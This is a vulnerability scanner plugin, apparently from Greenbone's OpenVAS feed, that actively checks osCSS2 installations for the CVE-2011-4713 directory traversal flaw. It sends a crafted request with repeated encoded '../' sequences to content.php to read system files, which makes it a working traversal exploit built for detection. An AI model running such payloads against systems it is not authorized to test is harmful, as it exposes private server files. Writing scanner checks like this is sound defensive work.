# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:oscss:oscss";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902763");
  script_version("2022-05-11T09:03:58+0000");
  script_tag(name:"last_modification", value:"2022-05-11 09:03:58 +0000 (Wed, 11 May 2022)");
  script_tag(name:"creation_date", value:"2011-12-12 03:17:35 +0530 (Mon, 12 Dec 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2011-4713");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("osCSS2 < 2.1.1 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_oscss_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("oscss/http/detected");

  script_tag(name:"summary", value:"osCSS2 is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to input validation error in 'id' parameter to
  'shopping_cart.php' and 'content.php', which allows attackers to read arbitrary files via
  ../(dot dot) sequences.");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform
  directory traversal attacks and read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"osCSS2 version 2.1.0 and prior.");

  script_tag(name:"solution", value:"Update to version 2.1.1 or later.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18099/");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Nov/117");
  script_xref(name:"URL", value:"http://www.rul3z.de/advisories/SSCHADV2011-034.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/content.php?_ID=" + crap(data: "..%2f", length: 3 * 15) + files[file];

  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
